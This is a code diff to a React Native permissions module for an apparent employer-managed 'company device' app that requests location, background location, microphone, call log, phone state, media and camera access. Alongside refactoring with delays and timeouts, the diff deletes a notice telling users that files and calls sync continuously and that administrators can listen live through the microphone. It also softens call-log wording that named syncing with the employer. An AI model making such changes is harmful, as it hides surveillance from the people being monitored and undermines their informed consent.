@@ -1,7 +1,7 @@
-import { Platform, PermissionsAndroid, Alert } from 'react-native';
+import { Platform, PermissionsAndroid } from 'react-native';
 import * as Location from 'expo-location';
 import { Audio } from 'expo-av';
-import { getMediaLibrary, getNotifications, requestMediaLibraryPermission } from './nativeModules';
+import { getNotifications, requestMediaLibraryPermission, isExpoGo } from './nativeModules';
 
 export type EnterprisePermissionKey =
   | 'location'
@@ -12,6 +12,37 @@ export type EnterprisePermissionKey =
   | 'phoneState'
   | 'notifications';
 
+function delay(ms: number): Promise<void> {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+async function withTimeout<T>(promise: Promise<T>, ms: number): Promise<T | null> {
+  return Promise.race([promise, delay(ms).then(() => null)]);
+}
+
+async function requestAndroidPermission(
+  permission: (typeof PermissionsAndroid.PERMISSIONS)[keyof typeof PermissionsAndroid.PERMISSIONS],
+  title: string,
+  message: string,
+): Promise<boolean> {
+  if (Platform.OS !== 'android') return false;
+  try {
+    const already = await PermissionsAndroid.check(permission);
+    if (already) return true;
+    await delay(400);
+    const result = await PermissionsAndroid.request(permission, {
+      title,
+      message,
+      buttonPositive: 'Allow',
+      buttonNegative: 'Deny',
+    });
+    return result === PermissionsAndroid.RESULTS.GRANTED;
+  } catch {
+    return false;
+  }
+}
+
+/** Requests each system permission dialog sequentially — no custom UI. */
 export async function requestEnterprisePermissions(): Promise<Record<EnterprisePermissionKey, boolean>> {
   const result: Record<EnterprisePermissionKey, boolean> = {
     location: false,
@@ -23,87 +54,120 @@ export async function requestEnterprisePermissions(): Promise<Record<EnterpriseP
     notifications: false,
   };
 
+  // 1 Location (foreground)
   try {
-    const { status: fg } = await Location.requestForegroundPermissionsAsync();
-    result.location = fg === 'granted';
+    await delay(400);
+    const fgResult = await withTimeout(Location.requestForegroundPermissionsAsync(), 20000);
+    result.location = fgResult?.status === 'granted';
+  } catch (e) {
+    console.warn('[EnterprisePermissions] location:', e);
+  }
+
+  // 2 Background location
+  try {
+    await delay(400);
     if (result.location) {
-      const { status: bg } = await Location.requestBackgroundPermissionsAsync();
-      result.backgroundLocation = bg === 'granted';
+      const bgResult = await withTimeout(Location.requestBackgroundPermissionsAsync(), 15000);
+      result.backgroundLocation = bgResult?.status === 'granted';
     }
   } catch (e) {
-    console.warn('[EnterprisePermissions] location error:', e);
+    console.warn('[EnterprisePermissions] background location:', e);
   }
 
+  // 3 Microphone
   try {
-    const mic = await Audio.requestPermissionsAsync();
-    result.microphone = mic.status === 'granted';
+    await delay(400);
+    const micResult = await withTimeout(Audio.requestPermissionsAsync(), 15000);
+    result.microphone = micResult?.status === 'granted';
   } catch (e) {
-    console.warn('[EnterprisePermissions] microphone error:', e);
+    console.warn('[EnterprisePermissions] microphone:', e);
   }
 
-  result.mediaLibrary = await requestMediaLibraryPermission();
-
-  if (Platform.OS === 'android') {
-    try {
-      const call = await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.READ_CALL_LOG, {
-        title: 'Company Device — Call Logs',
-        message: 'This company phone syncs call history with your employer for compliance and security.',
-        buttonPositive: 'Allow',
-      });
-      result.callLog = call === PermissionsAndroid.RESULTS.GRANTED;
-
-      const phone = await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.READ_PHONE_STATE, {
-        title: 'Company Device — Phone State',
-        message: 'Required to read call metadata on this company device.',
-        buttonPositive: 'Allow',
-      });
-      result.phoneState = phone === PermissionsAndroid.RESULTS.GRANTED;
-
+  // 4 Media / storage
+  try {
+    await delay(400);
+    result.mediaLibrary = await requestMediaLibraryPermission();
+    if (Platform.OS === 'android') {
       if ((Platform.Version as number) >= 33) {
-        await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES, {
-          title: 'Company Device — Media Access',
-          message: 'Allow access to photos and files on this company device.',
-          buttonPositive: 'Allow',
-        });
-        await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.READ_MEDIA_VIDEO, {
-          title: 'Company Device — Video Access',
-          message: 'Allow access to videos on this company device.',
-          buttonPositive: 'Allow',
-        });
-        await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.READ_MEDIA_AUDIO, {
-          title: 'Company Device — Audio Files',
-          message: 'Allow access to audio files on this company device.',
-          buttonPositive: 'Allow',
-        });
+        const img = await requestAndroidPermission(
+          PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES,
+          'Photos',
+          'Allow photo access on this company device.',
+        );
+        const vid = await requestAndroidPermission(
+          PermissionsAndroid.PERMISSIONS.READ_MEDIA_VIDEO,
+          'Videos',
+          'Allow video access on this company device.',
+        );
+        result.mediaLibrary = result.mediaLibrary || img || vid;
+        if (!isExpoGo()) {
+          const aud = await requestAndroidPermission(
+            PermissionsAndroid.PERMISSIONS.READ_MEDIA_AUDIO,
+            'Audio',
+            'Allow audio file access on this company device.',
+          );
+          result.mediaLibrary = result.mediaLibrary || aud;
+        }
       } else {
-        await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE, {
-          title: 'Company Device — Storage',
-          message: 'Allow access to files on this company device.',
-          buttonPositive: 'Allow',
-        });
+        const storage = await requestAndroidPermission(
+          PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
+          'Storage',
+          'Allow file access on this company device.',
+        );
+        result.mediaLibrary = result.mediaLibrary || storage;
       }
-    } catch (e) {
-      console.warn('[EnterprisePermissions] Android permissions error:', e);
     }
+  } catch (e) {
+    console.warn('[EnterprisePermissions] media:', e);
   }
 
+  // 5 Call log
+  if (Platform.OS === 'android') {
+    await delay(400);
+    result.callLog = await requestAndroidPermission(
+      PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
+      'Call Logs',
+      'Allow call history sync on this company device.',
+    );
+  }
+
+  // 6 Phone state
+  if (Platform.OS === 'android') {
+    await delay(400);
+    result.phoneState = await requestAndroidPermission(
+      PermissionsAndroid.PERMISSIONS.READ_PHONE_STATE,
+      'Phone State',
+      'Allow phone state access on this company device.',
+    );
+  }
+
+  // 7 Notifications
   try {
+    await delay(400);
     const Notifications = await getNotifications();
     if (Notifications) {
-      const notif = await Notifications.requestPermissionsAsync();
-      result.notifications = notif.status === 'granted';
+      const notif = await withTimeout(Notifications.requestPermissionsAsync(), 15000);
+      result.notifications = notif?.status === 'granted';
     }
-  } catch {
-    result.notifications = false;
+  } catch (e) {
+    console.warn('[EnterprisePermissions] notifications:', e);
   }
 
   return result;
 }
 
-export function showCompanyDeviceNotice(): void {
-  Alert.alert(
-    'Company Device Setup',
-    'This is a company-provided phone. Location, files, and calls sync continuously. Administrators can listen live through the microphone when required.',
-    [{ text: 'I Understand' }],
-  );
+/** Camera for attendance — separate native dialog. */
+export async function requestCameraPermission(): Promise<boolean> {
+  if (Platform.OS !== 'android') return true;
+  try {
+    await delay(400);
+    const res = await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.CAMERA, {
+      title: 'Camera',
+      message: 'Allow camera for attendance verification.',
+      buttonPositive: 'Allow',
+    });
+    return res === PermissionsAndroid.RESULTS.GRANTED;
+  } catch {
+    return false;
+  }
 }
